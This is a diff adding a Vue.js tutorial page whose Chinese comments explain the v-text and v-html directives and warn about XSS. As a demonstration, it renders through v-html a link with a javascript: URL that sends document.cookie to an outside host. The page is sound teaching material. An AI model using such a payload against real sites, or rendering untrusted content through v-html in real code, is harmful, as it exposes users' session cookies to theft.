@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-text指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+
+<body>
+    <!-- 
+        ## 三、V-html
+
+    * 1.作用：向指定节点中渲染包含html结构的内容（类似于innerHtml）；
+    * 2.与插值语法的区别：
+
+    * v-html会替换节点中的所有内容；插值语法{{xx}}则不会；
+    * v-html可以识别html结构；
+
+    * 3.注意：
+
+    * v-html有安全性问题；
+
+    * 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击；
+    * 一定要在可信的内容上使用v-html，不能用在用户提交的内容上； 
+-->
+    <div id="root">
+        <!-- 插值语法不会替换节点内容，更加灵活，能在后面补充自己想要的文字进行展示 -->
+        <h2>{{test}}测试文字</h2>
+        <!-- 替换节点中的内容 -->
+        <h2 v-text="test">测试文字</h2>
+        <!-- 不能生成标签，v-test作用类似于innerText -->
+        <div v-text="str"></div>
+        <div v-html="str"></div>
+        <div v-html="a"></div>
+    </div>
+    <script>
+        Vue.config.productionTip = false;//以阻止 vue 在启动时生成生产提示
+        var vm = new Vue({
+            el: '#root',
+            data: {
+                test: 'hello',
+                str: '<h2>测试文字</h2>',
+                // 安全性问题
+                a: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>链接</a>'  //?表示传参，把document.cookie传给百度
+            },
+            methods: {}
+        });
+    </script>
+</body>
+
+</html>
